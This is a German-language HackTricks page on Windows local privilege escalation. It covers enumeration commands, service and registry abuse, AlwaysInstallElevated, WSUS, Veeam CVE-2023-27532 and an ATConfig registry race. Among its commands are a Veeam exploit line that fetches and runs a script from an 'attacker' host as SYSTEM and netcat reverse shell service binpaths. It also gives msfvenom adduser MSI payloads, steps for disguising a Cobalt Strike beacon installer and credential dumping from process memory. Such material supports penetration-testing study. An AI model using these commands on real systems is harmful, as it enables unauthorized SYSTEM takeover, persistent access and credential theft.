# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation Vektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Einführende Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sieh dir die folgende Seite für mehr Informationen zu ACLs - DACLs/SACLs/ACEs an:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was integrity levels in Windows sind, solltest du die folgende Seite lesen, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die dich daran hindern können, das System zu enumerating, ausführbare Dateien zu starten oder sogar deine Aktivitäten zu detect. Du solltest die folgende Seite lesen und all diese Abwehrmechanismen enumerieren, bevor du mit der privilege escalation enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Aufforderungen High IL zu erreichen, wenn AppInfo secure-path checks umgangen werden. Sieh dir den dedizierten UIAccess/Admin Protection bypass Workflow hier an:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kann missbraucht werden, um einen beliebigen SYSTEM-Registry-Schreibzugriff (RegPwn) zu erreichen:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System-Info

### Version info enumeration

Prüfe, ob die Windows-Version bekannte Schwachstellen hat (prüfe ebenfalls die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versionsexploits

Diese [site] ist praktisch, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu recherchieren. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive attack surface**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche credential/Juicy info in den env variables gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Wie Sie dies aktivieren, erfahren Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details der PowerShell-Pipeline-Ausführungen werden protokolliert, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wählen Sie stattdessen **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowersShell-Logs anzuzeigen, können Sie ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiges Protokoll der Aktivität und des Inhalts der Skriptausführung wird erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Vorgang bewahrt eine umfassende Prüfspur jeder Aktivität, die für Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess geliefert.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Protokollereignisse für den Script Block befinden sich im Windows Event Viewer unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S** sondern über http angefragt werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem du folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder das Folgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort erhältst wie eine der folgenden:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann ist **es ausnutzbar.** Wenn der letzte Registry-Wert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - Dies sind MiTM-weaponized Exploit-Skripte, um 'gefälschte' Updates in nicht-SSL WSUS-Traffic einzuschleusen.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Grunde ist dies der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den in den Internet Explorer-Einstellungen konfigurierten Proxy verwendet, haben wir somit die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als erhöhter Benutzer auf unserem System auszuführen.
>
> Außerdem, da der WSUS-Dienst die Einstellungen des aktuellen Benutzers nutzt, wird er auch dessen Zertifikatsspeicher verwenden. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine trust-on-first-use-artige Validierung des Zertifikats zu implementieren. Wenn das präsentierte Zertifikat vom Benutzer als vertrauenswürdig angesehen wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der von Angreifern kontrollierte Nachrichten verarbeitet und beliebige Befehle als **NT AUTHORITY\SYSTEM** ausführen lässt.

- **Recon**: Bestätigen Sie den Listener und die Version, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: Platziere einen PoC wie `VeeamHax.exe` mit den erforderlichen Veeam DLLs im selben Verzeichnis und löse dann eine SYSTEM-Payload über den lokalen Socket aus:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.

## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle existiert in Windows-**domain**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP signing is not enforced,** Benutzer Selbstrechte besitzen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, sowie die Möglichkeit für Benutzer, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit **Standardeinstellungen** erfüllt sind.

Finde das **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungswerte **aktiviert** (Wert ist **0x1**) sind, können Benutzer beliebiger Berechtigungsstufen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine meterpreter-Session haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis ein Windows-MSI-Binary zu erstellen, das Privilegien eskaliert. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (daher benötigen Sie GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach das erstellte Binary aus, um Privilegien zu eskalieren.

### MSI-Wrapper

Lies dieses Tutorial, um zu erfahren, wie man einen MSI-Wrapper mit diesen Tools erstellt. Beachte, dass du eine "**.bat**"-Datei einbinden kannst, wenn du **nur** Kommandozeilen **ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generiere** mit Cobalt Strike oder Metasploit ein **neues Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das **Setup Wizard**-Projekt und klicke **Next**.
- Vergib dem Projekt einen Namen, wie **AlwaysPrivesc**, nutze **`C:\privesc`** für den Speicherort, wähle **place solution and project in the same directory**, und klicke **Create**.
- Klicke weiterhin **Next**, bis du zu Schritt 3 von 4 gelangst (choose files to include). Klicke **Add** und wähle das Beacon-Payload, das du gerade generiert hast. Dann klicke **Finish**.
- Markiere das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, wie **Author** und **Manufacturer**, die die installierte App legitimer erscheinen lassen können.
- Rechtsklicke das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine **beacon.exe**-Datei und klicke **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Unter den **Custom Action Properties** ändere **Run64Bit** auf **True**.
- Schließlich **build** das Projekt.
- Falls die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 setzt.

### MSI-Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen entscheiden, was **protokolliert** wird, daher sollten Sie darauf achten.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es ist interessant zu wissen, wohin die Logs gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von local Administrator passwords** vorgesehen und stellt sicher, dass jedes Passwort **einzigartig, zufällig und regelmäßig aktualisiert** wird auf Computern, die einer Domain beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen durch ACLs ausreichende Berechtigungen gewährt wurden, sodass sie local admin passwords einsehen können, wenn sie autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **plain-text passwords in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Beginnend mit **Windows 8.1** hat Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) eingeführt, um Versuche unzuverlässiger Prozesse zu **blockieren**, den Speicher der LSA **zu lesen** oder Code zu injizieren und so das System weiter abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie pass-the-hash attacks zu schützen.| [**Weitere Informationen zu Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten security package authentifiziert werden, werden für den Benutzer typischerweise domain credentials erstellt.\
[**Mehr Informationen zu Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Mehr erfahren** darüber, was ein **Token** ist auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** und wie man sie missbraucht zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst beim Auflisten der Prozesse **prüfe auf Passwörter in der Befehlszeile des Prozesses**.\
Prüfe, ob du **eine laufende binary überschreiben kannst** oder ob du Schreibrechte des binary-Ordners hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Überprüfe immer, ob mögliche [**electron/cef/chromium debuggers** laufen — du könntest sie ausnutzen, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Binaries von Prozessen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst mit **procdump** von sysinternals einen memory dump eines laufenden Prozesses erstellen. Dienste wie FTP halten die **credentials in clear text in memory** — versuche, den Speicher zu dumpen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer erlauben, ein CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Dienste

Service Triggers erlauben Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selbst ohne SERVICE_START-Rechte kann man häufig privilegierte Services starten, indem man deren Trigger auslöst. Siehe enumeration and activation techniques hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Dienste abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten.
```bash
sc qc <service_name>
```
Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um das erforderliche privilege level für jeden Service zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" irgendeinen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Sie können den Dienst wie folgt aktivieren
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost auf SSDPSRV angewiesen ist, um zu funktionieren (für XP SP1)**

**Another workaround** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Dienst-Binärpfad ändern**

Wenn in einem Szenario die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** auf einen Dienst verfügt, ist eine Änderung der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binary.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, wodurch Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Erlaubt das Übernehmen des Eigentümers und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Fähigkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Fähigkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Service-Binaries

**Prüfen Sie, ob Sie die von einem Service ausgeführte Binary ändern können** oder ob Sie **Schreibberechtigungen für den Ordner** haben, in dem die Binary liegt ([**DLL Hijacking**](dll-hijacking/index.html))**.**\  
Sie können alle Binaries, die von einem Service ausgeführt werden, mit **wmic** (nicht in system32) abfragen und Ihre Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Berechtigungen zur Änderung der Service-Registry

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für eine Service-**Registry** **prüfen**, indem du Folgendes ausführst:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann das vom Dienst ausgeführte Binary verändert werden.

Um den Pfad des ausgeführten Binaries zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Einige Windows-Zugänglichkeitsfunktionen erstellen pro Benutzer **ATConfig**-Keys, die später von einem **SYSTEM**-Prozess in einen HKLM-Session-Key kopiert werden. Eine registry **symbolic link race** kann diesen privilegierten Schreibvorgang in **jeden HKLM path** umleiten und damit ein beliebiges HKLM **value write**-Primitive ermöglichen.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Zugänglichkeitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzerkontrollierte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während Login/secure-desktop-Übergängen erstellt und ist vom Benutzer beschreibbar.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Fülle den **HKCU ATConfig**-Wert mit dem Inhalt, der von SYSTEM geschrieben werden soll.
2. Löse den secure-desktop-Kopiervorgang aus (z. B. **LockWorkstation**), der den AT-Broker-Flow startet.
3. Gewinne das Rennen, indem du einen **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` platzierst; wenn das oplock auslöst, ersetze den **HKLM Session ATConfig**-Key durch einen **registry link** zu einem geschützten HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du eine beliebige HKLM value write-Fähigkeit hast, pivot zum LPE, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler Benutzer starten kann (z. B. **`msiserver`**) und starte ihn nach dem Write. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil des Rennens.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory Berechtigungen

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie daraus Unterschlüssel erstellen können**. Im Fall von Windows-Services reicht das **aus, um beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Nicht in Anführungszeichen gesetzte Service-Pfade

